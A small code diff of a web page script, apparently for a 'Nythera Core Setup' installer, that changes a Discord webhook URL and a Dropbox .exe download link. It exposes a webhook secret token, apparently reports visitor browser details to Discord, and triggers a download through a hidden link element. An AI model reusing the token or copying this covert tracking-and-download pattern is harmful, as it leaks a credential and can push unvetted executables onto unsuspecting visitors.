@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1485428722835390537/H5BsXADXLL90KGSsZbBtTUsBKlYx9At80KnieauybcGUFYdGgGF7JwTAV4Qt8cf7okvs';
+const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1485428722835390537/H5BsXADXLL90KGSsZbBtTUsBKlYx9At80KnieauybcGUFYdGgGF7JwTAV4Qt8cf7okvs';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/zvnz8hqdw57j8avhhxk3h/Nythera-Core-Setup-2.0.0.exe?rlkey=fd92avm077sicsyvj9tkqrhq3&st=v0vryz89&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/3gc97jnjt0q1zk7euy2wr/Nythera-Setup-1.0.3.exe?rlkey=61hws47xfa0z412o3fw2903rj&st=wz4jw015&dl=1';
     a.download = 'NytheraCore Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
